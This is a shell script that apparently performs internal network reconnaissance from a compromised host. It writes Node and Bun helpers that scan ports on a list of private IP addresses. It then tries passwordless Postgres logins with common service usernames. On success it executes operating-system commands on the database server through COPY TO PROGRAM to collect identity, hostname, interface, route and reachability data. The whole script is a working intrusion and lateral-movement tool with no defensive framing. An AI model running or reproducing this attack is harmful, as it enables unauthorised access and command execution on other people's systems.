#!/bin/sh
echo "== HOST =="
id 2>/dev/null; hostname
cat > /tmp/i5791p3net.js <<'JS'
const net=require("node:net");
const tcp=(h,p,ms=5000)=>new Promise(r=>{const s=net.connect({host:h,port:p});let d=false;const f=x=>{if(!d){d=true;s.destroy();r(x)}};s.setTimeout(ms);s.on("connect",()=>f("OPEN"));s.on("timeout",()=>f("TIMEOUT"));s.on("error",e=>f("ERR:"+(e.code||e.message)));});
(async()=>{
for(const [h,p] of [["10.1.72.1",5432],["10.1.72.1",5434],["10.1.72.4",5432],["10.1.72.4",7990],["10.1.17.70",5432],["10.1.72.5",8085],["10.0.29.254",443],["10.0.30.2",2049],["10.0.30.7",2049],["192.168.8.21",5432],["10.0.226.22",80],["10.0.226.9",80],["10.0.68.28",80],["10.156.1.207",443],["10.156.0.47",443]]) console.log("TCP",h,p,await tcp(h,p));
})();
JS
node /tmp/i5791p3net.js 2>&1
echo "== PG 10.1.72.1 =="
cat > /tmp/i5791p3pg.js <<'JS'
import { SQL } from "bun";
async function trydb(user){
  const url=`postgres://${user}@10.1.72.1:5432/postgres`;
  try{
    const db=new SQL(url,{connectionTimeout:6,max:1});
    const r=await db.unsafe("select current_user cu, current_database() db, version() v");
    console.log("PG_OK",user,JSON.stringify(r).slice(0,400));
    const cmd="id > /tmp/i5791_r.txt 2>&1; hostname >> /tmp/i5791_r.txt; cat /etc/hostname >> /tmp/i5791_r.txt 2>&1; (ip -4 addr 2>/dev/null || ifconfig 2>/dev/null) >> /tmp/i5791_r.txt; ip route 2>/dev/null >> /tmp/i5791_r.txt; (echo > /dev/tcp/10.156.1.207/443) >/dev/null 2>&1 && echo ROUTE_10.156.1.207_443_OPEN >> /tmp/i5791_r.txt || echo ROUTE_10.156.1.207_443_CLOSED >> /tmp/i5791_r.txt; (echo > /dev/tcp/10.156.0.47/443) >/dev/null 2>&1 && echo ROUTE_10.156.0.47_443_OPEN >> /tmp/i5791_r.txt || echo ROUTE_10.156.0.47_443_CLOSED >> /tmp/i5791_r.txt; chmod 644 /tmp/i5791_r.txt";
    await db.unsafe("COPY (SELECT '') TO PROGRAM $c$"+cmd+"$c$");
    const r2=await db.unsafe("select pg_read_file('/tmp/i5791_r.txt') as o");
    console.log("PG_CMD_OUT",JSON.stringify(r2).slice(0,2000));
    await db.close();
    return true;
  }catch(e){ console.log("PG_ERR",user,String(e.message).slice(0,200)); return false; }
}
(async()=>{ for(const u of ["postgres","atlassian","bamboo","root"]){ if(await trydb(u)) break; } })();
JS
bun /tmp/i5791p3pg.js 2>&1
echo "== DONE =="
